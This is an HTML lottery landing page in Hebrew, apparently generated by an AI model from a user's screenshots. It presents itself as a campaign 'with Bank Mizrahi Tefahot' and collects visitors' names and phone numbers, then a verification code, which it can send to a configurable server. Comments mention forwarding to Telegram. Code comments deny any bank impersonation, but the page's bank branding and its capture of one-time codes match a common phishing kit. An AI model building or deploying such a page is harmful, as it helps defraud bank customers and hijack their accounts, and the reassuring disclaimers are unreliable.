<!doctype html>
<html lang="he" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>הגרלה — דף נחיתה</title>
  <meta name="referrer" content="no-referrer">
  <link href="https://fonts.googleapis.com/css2?family=Alef:wght@300;400;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --blue:#134b75;
      --orange:#ff7a00;
      --white:#ffffff;
      --shadow: rgba(19, 38, 79, 0.12);
      --max-width:760px;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:"Alef",sans-serif;direction:rtl;color:var(--blue);-webkit-font-smoothing:antialiased}
    body{background:#fff}

    /* Left vertical bar like in your screenshots */
    .left-bar {
      position:fixed;
      left:12px;
      top:12px;
      bottom:12px;
      width:8px;
      background:linear-gradient(#cfcfcf,#c3c3c3);
      border-radius:4px;
      z-index:50;
      box-shadow:inset 0 0 0 1px rgba(0,0,0,0.02);
    }

    /* Hero image fills top area */
    .hero {
      width:100%;
      min-height:52vh;
      height:60vh;
      background-image: url('https://www2.0zz0.com/2025/10/20/18/772546082.jpeg');
      background-size:cover;
      background-position:center top;
      display:flex;
      align-items:flex-start;
      justify-content:center;
      position:relative;
    }
    .hero::before{
      content:"";
      position:absolute;inset:0;
      background: linear-gradient(rgba(255,255,255,0.05), rgba(255,255,255,0.88) 70%, rgba(255,255,255,0.98));
      z-index:1;
    }
    .hero-inner{position:relative;z-index:2;width:100%;max-width:var(--max-width);padding:20px;text-align:center}

    /* Content card that overlaps hero for the look from your example */
    .card {
      width:100%;
      max-width:var(--max-width);
      margin: -36px auto 40px;
      background:var(--white);
      border-radius:12px;
      padding:34px 28px 60px;
      box-shadow:0 10px 30px rgba(10,20,40,0.04);
      position:relative;
      text-align:center;
    }

    /* Titles & paragraphs */
    .brand { font-size:22px;font-weight:700;margin:4px 0 14px;color:var(--blue) }
    .lead { font-size:26px; line-height:1.5; font-weight:700; margin:8px auto 14px; color:var(--blue) }
    .sub { font-size:18px; line-height:1.8; color:var(--blue); margin-bottom:14px }
    .choose { font-size:20px; font-weight:700; margin:18px 0 10px }

    /* Big pill buttons */
    .btn {
      display:block;
      width:calc(100% - 40px);
      max-width:700px;
      margin:18px auto;
      background:var(--orange);
      color:#fff;
      border:none;
      padding:20px 26px;
      border-radius:60px;
      font-size:20px;
      font-weight:700;
      box-shadow: 0 10px 28px var(--shadow), 0 0 30px rgba(130,100,255,0.06);
      cursor:pointer;
      text-decoration:none;
    }
    .btn:active{ transform:translateY(1px) }

    /* Form (registration) */
    .form-wrap{ max-width:520px; margin:8px auto 0; text-align:right }
    label{ display:block; margin:12px 0 6px; font-size:14px; color:#4b5b6d }
    input[type="text"], input[type="email"], input[type="tel"]{
      width:100%; padding:12px 14px; border:1px solid #e6e6e6; border-radius:8px; font-size:15px; background:#fff;
    }
    .note { font-size:13px; color:#777; margin-top:8px; text-align:center }

    /* Verification area */
    .verify-area { display:none; max-width:460px; margin:14px auto 0; text-align:center }
    .verify-box { padding:18px; border-radius:10px; border:1px dashed #eee; }
    .verify-box p{ margin:8px 0 12px; color:#2f4d6a }

    /* Modals / page-like navigation */
    .page-hidden{ display:none !important }

    /* Small screens */
    @media (max-width:520px){
      .lead{ font-size:22px }
      .hero{ min-height:44vh; height:50vh; background-position:center 10% }
    }

  </style>
</head>
<body>
  <div class="left-bar" aria-hidden="true"></div>

  <section class="hero" aria-label="תמונה עליונה">
    <div class="hero-inner" role="img" aria-hidden="true">
      <!-- The hero image itself contains the heading in your example; we keep the background image -->
    </div>
  </section>

  <main class="card" role="main" aria-label="תוכן הדף">
    <div id="landing">
      <div class="brand">עם בנק מזרחי טפחות</div>

      <p class="lead">עם הקמפיין לשנת 2024, הפרסים שלנו שונים על פי</p>

      <p class="sub">ערכם ומספרם, וכוללים פרסים גדולים ויומיים, שבועיים, חודשיים ומשולשים לכל לקוחותינו.</p>

      <p class="choose">בחר את השירות המתאים לך</p>

      <!-- Two large buttons; both מובילים לטופס ההרשמה החוקי בעמוד זה -->
      <button id="shareBtn" class="btn" type="button" aria-label="שתפו את ההגרלה">שתפו את ההגרלה</button>
      <button id="enterBtn" class="btn" type="button" aria-label="להשתתפות בהגרלה לחצו כאן">להשתתפות בהגרלה לחצו כאן</button>
    </div>

    <!-- Registration form (לא איסוף סיסמאות) -->
    <div id="formPage" class="page-hidden">
      <h2 style="margin-top:6px;font-size:20px;color:var(--blue)">הרשמה להגרלה</h2>
      <p class="note">מלאו את הפרטים הבאים כדי להשתתף. אנו לא אוספים סיסמאות או פרטי חשבון רגישים.</p>

      <div class="form-wrap">
        <label for="fullname">שם מלא</label>
        <input id="fullname" type="text" placeholder="שם פרטי ושם משפחה" autocomplete="name">

        <label for="email">אימייל (אופציונאלי)</label>
        <input id="email" type="email" placeholder="example@mail.com">

        <label for="phone">טלפון</label>
        <input id="phone" type="tel" placeholder="05X-XXXXXXX" autocomplete="tel">

        <div style="height:12px"></div>

        <button id="submitBtn" class="btn" type="button">שלח פרטים והרשמה</button>

        <div class="note" style="margin-top:10px">הנתונים ישמשו אך ורק להרשמה להגרלה. לפרטיות ולשימושים נוספים תקבלו הסבר.</div>
      </div>
    </div>

    <!-- Verification page: after submit -->
    <div id="verifyArea" class="page-hidden">
      <div class="verify-box">
        <p style="font-weight:700">אימות קוד</p>
        <p class="note">הזן את קוד האימות שנשלח אליך כדי להשלים את ההרשמה.</p>
        <input id="vcode" type="text" placeholder="קוד אימות (6 ספרות)" style="width:75%;padding:10px;border-radius:8px;border:1px solid #e6e6e6;margin-top:8px">
        <div style="height:12px"></div>
        <button id="verifyBtn" class="btn" type="button">אמת והשלם הרשמה</button>
        <div id="verifyResult" style="margin-top:12px;color:#2f8a4d"></div>
      </div>
    </div>

    <div id="finalMsg" class="page-hidden" style="max-width:520px;margin:18px auto;text-align:center">
      <p style="color:green;font-weight:700">תודה — ההרשמה הושלמה!</p>
      <p class="note">אם יש שאלות פנו אלינו בתמיכה.</p>
    </div>

  </main>

  <script>
    /*
      Safety note (קרא בבקשה):
      - דף זה לא אוסף סיסמאות ולא מנסה להתחזות למערכת בנקאית.
      - הקובץ מיועד לשימוש חוקי בלבד: הרשמה להגרלה/דף נחיתה.
      - כדי לשלוח הודעות ל‑Telegram יש להפעיל שרת צד‑שרת (server) שבו שמים את טוקן הבוט וה‑chat_id בסביבת שרת (ENV).
      - אל תכניס טוקן/chat_id ישירות לתוך דף ה‑HTML; זה יחשוף אותם לכל מבקר.
      - בדוגמה הבאה: אם לא מוגדר SERVER_ENDPOINT המשתמש יראה סימולציה (ללא שליחת הודעות אמיתית).
    */

    // Configure this: אם יש לך שרת, רשום כאן את נקודת ה‑API המלאה (לדוגמה: https://example.com/submit)
    // השאר ריק כדי לראות סימולציה מקומית בלבד.
    const SERVER_ENDPOINT = ''; // <-- כאן להכניס את כתובת השרת שלך (לא טוקן!)
    // Example server endpoints expected:
    // POST /submit  { name, email, phone }  -> returns { ok: true }
    // POST /verify  { code }  -> returns { ok: true }  (server validates code)

    // UI elements
    const shareBtn = document.getElementById('shareBtn');
    const enterBtn = document.getElementById('enterBtn');
    const landing = document.getElementById('landing');
    const formPage = document.getElementById('formPage');
    const verifyArea = document.getElementById('verifyArea');
    const finalMsg = document.getElementById('finalMsg');

    function show(el){
      el.classList.remove('page-hidden');
    }
    function hide(el){
      el.classList.add('page-hidden');
    }

    // Both buttons open the registration form (matching your request to "direct to page")
    shareBtn.addEventListener('click', () => {
      hide(landing);
      show(formPage);
      window.scrollTo({top:0,behavior:'smooth'});
    });
    enterBtn.addEventListener('click', () => {
      hide(landing);
      show(formPage);
      window.scrollTo({top:0,behavior:'smooth'});
    });

    // Submission handler
    document.getElementById('submitBtn').addEventListener('click', async () => {
      const name = document.getElementById('fullname').value.trim();
      const email = document.getElementById('email').value.trim();
      const phone = document.getElementById('phone').value.trim();

      if (!name || !phone) {
        alert('אנא מלא שם וטלפון כדי להמשיך.');
        return;
      }

      document.getElementById('submitBtn').disabled = true;
      document.getElementById('submitBtn').textContent = 'שולח...';

      // If SERVER_ENDPOINT is configured, POST to it.
      if (SERVER_ENDPOINT) {
        try {
          const res = await fetch(SERVER_ENDPOINT + '/submit', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ name, email, phone })
          });
          const data = await res.json();
          if (!res.ok) {
            alert(data.error || 'שגיאה בשמירת הפרטים');
            document.getElementById('submitBtn').disabled = false;
            document.getElementById('submitBtn').textContent = 'שלח פרטים והרשמה';
            return;
          }
          // assume server sent code via SMS/email or Telegram to admin as needed
          hide(formPage);
          show(verifyArea);
        } catch (err) {
          console.error(err);
          alert('שגיאת רשת. נסה שוב מאוחר יותר.');
        } finally {
          document.getElementById('submitBtn').disabled = false;
          document.getElementById('submitBtn').textContent = 'שלח פרטים והרשמה';
        }
      } else {
        // SIMULATION MODE (no server configured)
        // Generate a mock code and show verify screen.
        window._mockVerificationCode = String(Math.floor(100000 + Math.random()*900000));
        console.log('Mock verification code (for demo):', window._mockVerificationCode);
        hide(formPage);
        show(verifyArea);
        alert('אין שרת מחובר — זה מצב סימולציה. קוד האימות מופיע בקונסול הדפדפן (Console).');
        document.getElementById('submitBtn').disabled = false;
        document.getElementById('submitBtn').textContent = 'שלח פרטים והרשמה';
      }
    });

    // Verify handler
    document.getElementById('verifyBtn').addEventListener('click', async () => {
      const code = document.getElementById('vcode').value.trim();
      const resultEl = document.getElementById('verifyResult');
      resultEl.textContent = '';
      if (!code) { alert('הזן קוד אימות'); return; }

      document.getElementById('verifyBtn').disabled = true;
      document.getElementById('verifyBtn').textContent = 'בודק...';

      if (SERVER_ENDPOINT) {
        try {
          const res = await fetch(SERVER_ENDPOINT + '/verify', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ code })
          });
          const data = await res.json();
          if (!res.ok) {
            resultEl.style.color = 'red';
            resultEl.textContent = data.error || 'קוד שגוי';
          } else {
            hide(verifyArea);
            show(finalMsg);
          }
        } catch (err) {
          console.error(err);
          resultEl.style.color = 'red';
          resultEl.textContent = 'שגיאת רשת';
        } finally {
          document.getElementById('verifyBtn').disabled = false;
          document.getElementById('verifyBtn').textContent = 'אמת והשלם הרשמה';
        }
      } else {
        // SIMULATION: check against mock code
        if (code === window._mockVerificationCode) {
          hide(verifyArea);
          show(finalMsg);
        } else {
          resultEl.style.color = 'red';
          resultEl.textContent = 'קוד שגוי (במצב סימולציה הסתכל בקונסול הדפדפן)';
        }
        document.getElementById('verifyBtn').disabled = false;
        document.getElementById('verifyBtn').textContent = 'אמת והשלם הרשמה';
      }
    });

    // Accessibility: allow Esc to go back to landing from form
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        hide(formPage); hide(verifyArea); hide(finalMsg); show(landing);
      }
    });

  </script>
</body>
</html>